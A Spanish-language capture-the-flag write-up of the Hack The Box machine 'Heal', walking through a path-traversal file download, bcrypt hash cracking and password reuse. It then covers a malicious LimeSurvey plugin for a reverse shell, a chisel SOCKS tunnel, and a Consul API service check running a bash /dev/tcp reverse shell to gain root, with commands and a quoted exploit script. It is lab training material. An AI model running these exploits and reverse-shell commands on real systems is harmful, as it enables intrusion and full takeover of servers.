+++
author = "Andrés Del Cerro"
title = "Hack The Box: Heal Writeup | Medium"
date = "2024-12-30"
description = ""
tags = [
    "HackTheBox",
    "Heal",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Linux",
    "HTTP Enumeration",
    "HTML Injection",
    "Local File Inclusion",
    "Information Disclosure",
    "Directory Path Traversal",
    "Virtual Hosting",
    "Exfiltrating Database",
    "Hash Cracking",
    "Cracking",
    "Abusing CVE-2021-44967 (LimeSurvey)",
    "LimeSurvey Malicious Plugin",
    "Abusing Password Reuse",
    "Reverse Port Forwarding",
    "Reverse Socks Proxy",
    "Abusing Consul API Service"
]

+++

# Hack The Box: Heal Writeup

Welcome to my detailed writeup of the medium difficulty machine **"Heal"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration

```console
rustscan -a 10.129.142.207 --ulimit 5000 -g
10.129.142.207 -> [22,80]
```

```console
nmap -p22,80 -sCV 10.129.142.207 -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 18:52 CET
Nmap scan report for 10.129.142.207
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.94 seconds
```

# UDP Enumeration

```console
sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.142.207 -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 18:52 CET
Nmap scan report for 10.129.142.207
Host is up (0.037s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
1101/udp  closed pt2-discover
5555/udp  closed rplay
29595/udp closed unknown
31692/udp closed unknown
31731/udp closed unknown
37783/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.88 seconds
```

Del escaneo inicial conseguimos el dominio `heal.htb`, así que lo vamos a añadir al `/etc/hosts`.

# HTTP Enumeration
Como no hay otro servicio a parte del SSH y no es una versión vulnerable, vamos a empezar a enumerar el servicio web.
`whatweb` no nos reporta nada interesante excepto que se nos está redireccionando a `heal.htb` desde la dirección IP, esto puede ser un indicio de que se está utilizando Virtual Hosting.
```console
whatweb http://10.129.142.207
http://10.129.142.207 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.142.207], RedirectLocation[http://heal.htb/], Title[301 Moved Permanently], nginx[1.18.0]
http://heal.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.142.207], Script, Title[Heal], X-Powered-By[Express], nginx[1.18.0]
```

Otra cosa interesante que nos reporta, es la cabecera `X-Powered-By` cuyo valor es `Express`, quizás se está utilizando `node` en el lado del servidor.

Viendo el código fuente revela que esta aplicación fue creada con `create-react-app`
![Write-up Image](images/Screenshot_1.png)

Así se ve el sitio web principal.
![Write-up Image](images/Screenshot_2.png)

Vemos un panel de autenticación, si intentamos iniciar sesión vemos que se envía una solicitud de tipo POST a `api.heal.htb`, por lo cual podemos confirmar que se está utilizando Virtual Hosting por detrás.
![Write-up Image](images/Screenshot_3.png)

Vamos a añadir ese subdominio al `/etc/hosts`.

También vemos que podemos crearnos una cuenta.
![Write-up Image](images/Screenshot_4.png)

Cosas interesantes, nos reporta la ID del usuario, en este caso `2`, esto quiere decir que probablemente exista un usuario con ID `1` y quizás con ID `0`

Bajo el endpoint `/resume` podemos rellenar un formulario, que luego podemos descargar en PDF.
![Write-up Image](images/Screenshot_5.png)

Podemos inyectar código HTML en el PDF y se interpreta.
![Write-up Image](images/Screenshot_6.png)

Comprobando los metadatos del PDF encontramos que se ha generado con `wkhtmltopdf 0.12.6`
```console
exiftool 541c76096856979c27d5.pdf
ExifTool Version Number         : 12.76
File Name                       : 541c76096856979c27d5.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2024:12:30 19:01:12+01:00
File Access Date/Time           : 2024:12:30 19:01:54+01:00
File Inode Change Date/Time     : 2024:12:30 19:01:51+01:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           :
Creator                         : wkhtmltopdf 0.12.6
Producer                        : Qt 5.15.3
Create Date                     : 2024:12:30 18:01:12Z
Page Count                      : 1
```

[Esta herramienta es un binario](https://wkhtmltopdf.org/) para generar PDF's a través de sitios web, esto es interesante ya que quizás significa que se está aconteciendo un XSS por detrás en algún sitio.

# Local File Inclusion
Pero rápidamente podemos ver que se está pasando el contenido en HTML por detrás al endpoint, por lo cual no creo que pueda aprovecharme de esto `/exports`
![Write-up Image](images/Screenshot_7.png)

La respuesta del servidor nos indica que se ha creado el PDF y nos devuelve un nombre de archivo.
![Write-up Image](images/Screenshot_8.png)

Después de que se cree el PDF, se intenta descargar haciendo una solicitud de tipo `GET` al endpoint `/download` y pasándole el nombre del archivo completo mediante el query parameter `filename`
![Write-up Image](images/Screenshot_9.png)

En este punto, podemos pasar cualquier otro archivo y lo podemos descargar, por lo cual se esta aconteciendo un Local File Inclusion.
![Write-up Image](images/Screenshot_10.png)

Vemos que existen tres usuarios con una bash.
- root
- ralph
- postgres
- ron

# Keep Enumerating
En el recurso `/survey` encontramos un botón que nos redirecciona a `take-survey.heal.htb`, otro subdominio que vamos a añadir al `/etc/hosts`
![Write-up Image](images/Screenshot_11.png)

Me lleva a una encuesta, por detrás se está utilizando `LimeSurvey`, una aplicación web que utiliza PHP para crear encuestas online.
![Write-up Image](images/Screenshot_12.png)

Si mandamos la encuesta y leemos el código fuente, encontramos que está el usuario `ralph` y nos reporta que es administrador ya que nos están diciendo de contactar con el.
![Write-up Image](images/Screenshot_13.png)

Encontramos que tiene una vulnerabilidad de tipo RCE pero necesitamos estar autenticados.
![Write-up Image](images/Screenshot_14.png)

## The API is written in Rails!
Este paso fue clave, no encontraba nada hasta que iba a probar el típico endpoint `/swagger` en el navegador para ver si podía acceder a la documentación de la API, y me encontré lo siguiente.
![Write-up Image](images/Screenshot_15.png)

### Abusing the LFI to get the SQLite3 Database
Se está utilizando `Rails 7.1.4`, esto es interesante ya que los proyectos en Rails tienen una estructura de directorios particular y quizás podamos mediante el LFI conseguir algún archivo de configuración que contenga información privilegiada.

A través del LFI, podemos hacer Path Traversal para intentar cargar el archivo `Gemfile` típico en Rails, y volviendo atrás un par de directorios, vemos que lo conseguimos.
![Write-up Image](images/Screenshot_16.png)

Podemos comprobar la estructura de directorios que utiliza Rails, y vemos que en `/config/database.yml` es donde se almacena la información de conexión a base de datos, esto puede ser interesante, así que vamos a echarle un vistazo.
![Write-up Image](images/Screenshot_17.png)

Sorprendentemente en producción se está utilizando SQLite3, y aquí tenemos la ruta donde está la base de datos.

Vamos a descargar la base de datos utilizando `wget` y el LFI.
```console
wget 'http://api.heal.htb/download?filename=../../storage/development.sqlite3' --header='Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ'
--2024-12-30 19:35:05--  http://api.heal.htb/download?filename=../../storage/development.sqlite3
Resolving api.heal.htb (api.heal.htb)... 10.129.142.207
Connecting to api.heal.htb (api.heal.htb)|10.129.142.207|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 32768 (32K) [application/octet-stream]
Saving to: ‘download?filename=..%2F..%2Fstorage%2Fdevelopment.sqlite3’

download?filename=..%2F..%2Fstorage%2Fdevelopment.sqlite3  100%[======================================================================================================================================>]  32.00K  --.-KB/s    in 0.04s

2024-12-30 19:35:05 (866 KB/s) - ‘download?filename=..%2F..%2Fstorage%2Fdevelopment.sqlite3’ saved [32768/32768]
```

Importante pasarle a `wget` nuestro token JWT para poder utilizar la API.

Ahora cambiamos el nombre del archivo.
```console
mv download\?filename=..%2F..%2Fstorage%2Fdevelopment.sqlite3 development.sqlite3
```

Y comprobamos que efectivamente es una base de datos SQLite3.
```console
file development.sqlite3
development.sqlite3: SQLite 3.x database, last written using SQLite version 3045002, writer version 2, read version 2, file counter 2, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 2
```

Ahora con podemos explorar la base de datos con:
```console
sqlite3 development.sqlite3
```

Vemos una tabla `users` 
```console
sqlite> .tables
ar_internal_metadata  token_blacklists
schema_migrations     users
```

Y vemos un hash del usuario `ralph`
```console
sqlite> select * from users;
1|ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|2024-09-27 07:49:31.614858|2024-09-27 07:49:31.614858|Administrator|ralph|1
2|pointed@pointed.com|$2a$12$ODoDsGuIj7OaKEoFEMchqu.gXXCvPZrvTItOjnMtHdAbyXpkaohZi|2024-12-30 17:59:21.653630|2024-12-30 17:59:21.653630|pointed|pointed|0
```

## Cracking `ralph` hash
Este hash seguramente sea `bcrypt` ya que es mas típico que el resto de hashes que nos reporta `hashid`
```console
hashid
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
Analyzing '$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG'
[+] Blowfish(OpenBSD)
[+] Woltlab Burning Board 4.x
[+] bcrypt
```

Vamos a utilizar el modo `3200` en `hashcat` que corresponde a `bcrypt` y vemos que conseguimos crackear este hash.
```console
C:\Users\pc\Desktop\hashcat-6.2.6>.\hashcat.exe -a 0 -m 3200 .\hash.txt .\rockyou.txt --show
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
```

Entonces ahora tenemos un combo.
```
ralph:147258369
```

Podemos probar a iniciar sesión y vemos que conseguimos iniciar sesión como `ralph` correctamente
![Write-up Image](images/Screenshot_19.png)

Ahora, podemos probar si se están reutilizando las credenciales en `LimeSurvey` para poder abusar del RCE que hemos visto anteriormente, [podemos buscar](https://forums.limesurvey.org/forum/design-issues/81473-user-log-in-page ) que por defecto el panel de autenticación se encuentra en `/admin/admin.php`

Y efectivamente, se nos redirecciona al panel de autenticación.
![Write-up Image](images/Screenshot_20.png)

Y podemos iniciar sesión como `ralph`
![Write-up Image](images/Screenshot_21.png)

# Abusing CVE-2021-44967 -> Foothold
Ahora, podemos intentar abusar de la vulnerabilidad encontrada, que es simplemente creando un plugin malicioso.
Para esto, me ha servido mucho [esta guía del INE](https://ine.com/blog/cve-2021-44967-limesurvey-rce)
Nos dirigimos al apartado de `Plugins`
![Write-up Image](images/Screenshot_22.png)

Ahora nos clonamos [este repositorio](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE) que nos va a crear el plugin malicioso que necesitamos.
```console
git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE
Cloning into 'Limesurvey-RCE'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 24 (delta 2), reused 0 (delta 0), pack-reused 18 (from 1)
Receiving objects: 100% (24/24), 10.00 KiB | 3.33 MiB/s, done.
Resolving deltas: 100% (5/5), done.
```

Extraemos el zip que nos viene, esto es para que el Defender no detecte la reverse-shell como malware de primeras.
```console
unzip Y1LD1R1M.zip
Archive:  Y1LD1R1M.zip
replace config.xml? [y]es, [n]o, [A]ll, [N]one, [r]ename: A
  inflating: config.xml
  inflating: php-rev.php
```

Editamos la reverse shell y le especificamos nuestra IP de atacante y el puerto por el que vamos a estar en escucha, en este caso el puerto 443.
![Write-up Image](images/Screenshot_23.png)

Por como está hecho el sistema de plugins, tenemos que borrar el zip que nos venía y crearlo de nuevo con la nueva reverse shell para poder subirlo a `LimeSurvey` y lo detecte como un plugin válido.
```console
rm Y1LD1R1M.zip
zip -r Y1LD1R1M.zip config.xml php-rev.php
  adding: config.xml (deflated 56%)
  adding: php-rev.php (deflated 61%)
```

Ahora, vamos a subir el plugin.
![Write-up Image](images/Screenshot_24.png)

Lo seleccionamos y le damos a `Install`
![Write-up Image](images/Screenshot_25.png)

Y nos reporta que el plugin no es compatible con la versión de `LimeSurvey`
![Write-up Image](images/Screenshot_26.png)

Esto es por el archivo `config.xml`, ya que tiene un apartado para especificar con que versiones de `LimeSurvey` es compatible el plugin.
![Write-up Image](images/Screenshot_27.png)

Añadimos la versión actual (No sé si es necesaria añadir la versión `6.0` pero por si acaso la he añadido).

Y ahora vemos que si que podemos subir el plugin, le damos click a `Install`.
![Write-up Image](images/Screenshot_28.png)

Ahora, nos ponemos en escucha por el puerto 443 con `netcat`
```console
nc -lvnp 443
listening on [any] 443 ...
```

Ahora, vamos a buscar en la página de plugins el plugin malicioso y al poner el ratón encima, nos debemos de fijar en el ID del plugin, en este caso el 18.
![Write-up Image](images/Screenshot_29.png)

Ahora vamos a hacer los cambios necesarios en el archivo `exploit.py`.
Primero en la línea 64 vamos a cambiar la ubicación de nuestro archivo zip.
![Write-up Image](images/Screenshot_30.png)

En la línea 105 vamos a cambiar el dígito por el ID de nuestro plugin malicioso.
![Write-up Image](images/Screenshot_31.png)

Ahora simplemente lanzamos el exploit.
```console
python3 exploit.py http://take-survey.heal.htb ralph 147258369 80
_______________LimeSurvey RCE_______________


Usage: python exploit.py URL username password port
Example: python exploit.py http://192.26.26.128 admin password 80


== ██╗   ██╗ ██╗██╗     ██████╗  ██╗██████╗  ██╗███╗   ███╗ ==
== ╚██╗ ██╔╝███║██║     ██╔══██╗███║██╔══██╗███║████╗ ████║ ==
==  ╚████╔╝ ╚██║██║     ██║  ██║╚██║██████╔╝╚██║██╔████╔██║ ==
==   ╚██╔╝   ██║██║     ██║  ██║ ██║██╔══██╗ ██║██║╚██╔╝██║ ==
==    ██║    ██║███████╗██████╔╝ ██║██║  ██║ ██║██║ ╚═╝ ██║ ==
==    ╚═╝    ╚═╝╚══════╝╚═════╝  ╚═╝╚═╝  ╚═╝ ╚═╝╚═╝     ╚═╝ ==


[+] Retrieving CSRF token...
dGF2Rko2UG9zcFNxTFUyeUE4dm1QMlcxbDNVQVJIMHnpLn6u0NvCtGcYomg2iCwhvU5ADdybiRE3BwQo2OYHJw==
[+] Sending Login Request...
[+]Login Successful

[+] Upload Plugin Request...
[+] Retrieving CSRF token...
WTVRakttQl8xMXFsUVJMeEVDWDcwOVQ2cnQ5a1dveVI5mM_0j8QrwgUZKudenc1tWFyRQIaRhIbkihfzobQUag==
[+] Plugin Uploaded Successfully

[+] Install Plugin Request...
[+] Retrieving CSRF token...
WTVRakttQl8xMXFsUVJMeEVDWDcwOVQ2cnQ5a1dveVI5mM_0j8QrwgUZKudenc1tWFyRQIaRhIbkihfzobQUag==
[+] Plugin Installed Successfully

[+] Activate Plugin Request...
[+] Retrieving CSRF token...
WTVRakttQl8xMXFsUVJMeEVDWDcwOVQ2cnQ5a1dveVI5mM_0j8QrwgUZKudenc1tWFyRQIaRhIbkihfzobQUag==
[+] Plugin Activated Successfully

[+] Reverse Shell Starting, Check Your Connection :)
```

Y vemos que ganamos acceso como `www-data`
```console
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.103] from (UNKNOWN) [10.129.142.207] 46280
Linux heal 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 19:06:01 up  1:16,  0 users,  load average: 0.05, 0.06, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# User Pivoting
## Abusing Password Reuse
Después de hacer el tratamiento de la TTY podemos enumerar la máquina y en el directorio `/var/www/limesurvey` la instancia de `LimeSurvey`, [buscando en Google](https://forums.limesurvey.org/forum/installation-a-update-issues/112851-how-find-database-info-in-limesurvey) podemos encontrar esta entrada del foro oficial de LimeSurvey donde nos dice la ruta del archivo de configuración de acceso a base de datos.
Si comprobamos el archivo `/var/www/limesurvey/application/config/config.php` encontramos el siguiente fragmento.
```php
'db' => array(
			'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
			'emulatePrepare' => true,
			'username' => 'db_user',
			'password' => 'AdmiDi0_pA$$w0rd',
			'charset' => 'utf8',
			'tablePrefix' => 'lime_',
		),
```

Podemos probar esta credencial con el usuario `ron` y vemos que es válida.
```console
www-data@heal:~/limesurvey$ su ron
Password:
ron@heal:/var/www/limesurvey$ id
uid=1001(ron) gid=1001(ron) groups=1001(ron)
```

Podemos ver la flag de usuario.
```console
ron@heal:~$ cat user.txt
fc14dd386b663f87e...
```
# Privilege Escalation
Enumerando la máquina víctima encontramos varios puertos internos abiertos.
```console
ron@heal:~$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8503          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.1:8600          0.0.0.0:*                           -
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -
udp        0      0 0.0.0.0:60690           0.0.0.0:*                           -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
udp        0      0 127.0.0.1:8301          0.0.0.0:*                           -
udp        0      0 127.0.0.1:8302          0.0.0.0:*                           -
udp6       0      0 :::56297                :::*                                -
udp6       0      0 :::5353                 :::*                                -
```

## Reverse SOCKS w/chisel
Ahora, nos vamos a compartir `chisel` en la máquina víctima.
```console
wget http://10.10.14.103:8081/chisel
--2024-12-30 19:19:05--  http://10.10.14.103:8081/chisel
Connecting to 10.10.14.103:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8654848 (8.3M) [application/octet-stream]
Saving to: ‘chisel’

chisel              100%[===================>]   8.25M  13.0MB/s    in 0.6s

2024-12-30 19:19:05 (13.0 MB/s) - ‘chisel’ saved [8654848/8654848]
```

Ahora, en nuestra máquina, vamos a quedarnos en escucha por el puerto 1234 con `chisel`.
```console
/usr/share/chisel server -p 1234 --reverse
2024/12/30 20:20:00 server: Reverse tunnelling enabled
2024/12/30 20:20:00 server: Fingerprint /GS2uuu8CuSxHQaH/dUjw3+JVz9NHiY6OYXj4G8npZA=
2024/12/30 20:20:00 server: Listening on http://0.0.0.0:1234
```

Ahora desde la máquina víctima, vamos a conectarnos a nuestro puerto en escucha y vamos a especificar que queremos crear un proxy de tipo SOCKS.
```console
./chisel client 10.10.14.103:1234 R:socks
2024/12/30 19:20:39 client: Connecting to ws://10.10.14.103:1234
2024/12/30 19:20:39 client: Connected (Latency 35.998443ms)
```

Ahora vemos que nuestro puerto local 1080 pertenece a un proxy de tipo SOCKS hacia la máquina víctima.
```console
2024/12/30 20:20:38 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Vamos a editar el archivo `/etc/proxychains4.conf` y añadir la siguiente línea.
![Write-up Image](images/Screenshot_32.png)

Esto lo he hecho por si tengo que utilizar alguna herramienta en local para la explotación de alguno de estos puertos.

[Según Google que me redireccionó a este post](https://discuss.hashicorp.com/t/port-8500-not-reachable-what-is-it/44766) tiene pinta de que el puerto 8500 corresponde a `Consul` de `Hashicorp`, al puerto que corresponde al servicio HTTP.

Para comprobarlo, podemos crear un nuevo proxy en `FoxyProxy` que corresponda al proxy de tipo SOCKS que acabamos de crear
![Write-up Image](images/Screenshot_33.png)

Ahora si lo utilizamos, vemos que efectivamente, corresponde a este servicio.
![Write-up Image](images/Screenshot_34.png)

Específicamente a la versión `1.19.2`
![Write-up Image](images/Screenshot_35.png)

Buscando en `searchsploit` vemos que existen varias vulnerabilidades para este servicio.
```console
searchsploit consul
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Hashicorp Consul - Remote Command Execution via Rexec (Metasploit)                                                                                                                                      | linux/remote/46073.rb
Hashicorp Consul - Remote Command Execution via Services API (Metasploit)                                                                                                                               | linux/remote/46074.rb
Hashicorp Consul v1.0 - Remote Command Execution (RCE)                                                                                                                                                  | multiple/remote/51117.txt
Hassan Consulting Shopping Cart 1.18 - Directory Traversal                                                                                                                                              | cgi/remote/20281.txt
Hassan Consulting Shopping Cart 1.23 - Arbitrary Command Execution                                                                                                                                      | cgi/remote/21104.pl
PHPLeague 0.81 - '/consult/miniseul.php?cheminmini' Remote File Inclusion                                                                                                                               | php/webapps/28864.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Analizando uno de las vulnerabilidades, vemos que hay un endpoint de la API que sirve para registrar un servicio nuevo y realizar una comprobación de este servicio, donde podemos insertar un comando a nivel de sistema y conseguir ejecución remota de comandos.
```console
searchsploit multiple/remote/51117.txt -x
```

Podemos ver que `consul` debe estar siendo ejecutado por `root` ya que el binario pertenece a `root` y en principio no hay permisos especiales para ejecutarlo como otro usuario.
```console
ls -la /usr/local/bin/consul
-rwxr-xr-x 1 root root 183211529 Aug 27 16:06 /usr/local/bin/consul
```

Tampoco estoy seguro del todo de que el servicio web sea gestionado por este binario, pero vamos a probar a crear el servicio malicioso y ver como quien ganamos acceso.

Primero, vamos a ver que hace el script que se nos adjunta.
```python
import requests, sys

if len(sys.argv) < 6:
    print(f"\n[\033[1;31m-\033[1;37m] Usage: python3 {sys.argv[0]} <rhost> <rport> <lhost> <lport> <acl_token>\n")
    exit(1)

target = f"http://{sys.argv[1]}:{sys.argv[2]}/v1/agent/service/register"
headers = {"X-Consul-Token": f"{sys.argv[5]}"}
json = {"Address": "127.0.0.1", "check": {"Args": ["/bin/bash", "-c", f"bash -i >& /dev/tcp/{sys.argv[3]}/{sys.argv[4]} 0>&1"], "interval": "10s", "Timeout": "864000s"}, "ID": "gato", "Name": "gato", "Port": 80}

try:
    requests.put(target, headers=headers, json=json)
    print("\n[\033[1;32m+\033[1;37m] Request sent successfully, check your listener\n")
except:
    print("\n[\033[1;31m-\033[1;37m] Something went wrong, check the connection and try again\n")
```

En resumen, el script intenta explotar la API de Consul para registrar un servicio que, al ejecutarse, abre una **reverse shell** desde el host remoto (`rhost`) al local (`lhost`). Esto permite al atacante controlar remotamente el sistema donde Consul está corriendo.

Entonces, en nuestra máquina nos vamos a poner escucha por el puerto 443 con `netcat`
```console
nc -lvnp 443
listening on [any] 443 ...
```

Ahora, en la máquina víctima vamos a hacer la solicitud con `curl` en vez de utilizar el script ya que no lo veo necesario.
```console
ron@heal:~$ curl -X PUT "http://127.0.0.1:8500/v1/agent/service/register" -H "X-Consul-Token:" -d '{"Address":"10.10.14.103","check":{"Args":["/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.103/443 0>&1"],"interval":"10s","Timeout":"864000s"},"ID":"pwned","Name":"pwned","Port":80}'
```

Ahora podemos ver en el panel que se ha creado el nuevo servicio.
![Write-up Image](images/Screenshot_36.png)

Tras esperar unos segundos, vemos que me llega una conexión y ganamos acceso a la máquina víctima como `root`
```console
root@heal:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Podemos leer la flag de `root`
```console
root@heal:/# cat /root/root.txt
375a6e1860d9c...
```

¡Y ya estaría!

Happy Hacking! 🚀